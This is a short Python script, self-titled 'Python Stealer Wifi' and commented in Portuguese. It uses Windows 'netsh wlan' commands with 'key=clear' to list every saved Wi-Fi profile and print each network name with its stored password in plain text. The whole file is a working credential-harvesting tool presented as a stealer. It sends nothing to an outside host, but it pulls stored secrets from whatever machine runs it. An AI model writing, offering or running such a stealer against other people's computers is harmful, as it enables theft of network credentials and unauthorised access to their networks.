#! py
# subprocess system commands for windows.
import subprocess
# regular expressions. re
import re
# pip install art
from art import *
#stealer wifi pt-br serve para pegar redes wifi do windows, exibindo suas credenciais.

#ascii art
tprint("Python \n Stealer \n Wifi \n @ackercode")

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode('cp1252')

profile_names = re.findall(r"Todos os Perfis de Usu.rios: (.*)\r", command_output)

if not profile_names:
    profile_names = re.findall(r": (.*)\r", command_output)

#mostrando as redes wifi encontradas.
print("Perfis encontrados:", profile_names)

wifi_list = []

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name.strip()], capture_output = True).stdout.decode('cp1252')
        
        if re.search(r"Chave de seguran.a\s+:\s+Presente", profile_info):
            wifi_profile["ssid"] = name.strip()
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name.strip(), "key=clear"], capture_output = True).stdout.decode('cp1252')
            password = re.search(r"Conte.do da Chave\s+:\s+(.*)\r", profile_info_pass)
            
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

for x in range(len(wifi_list)):
    print(wifi_list[x]) 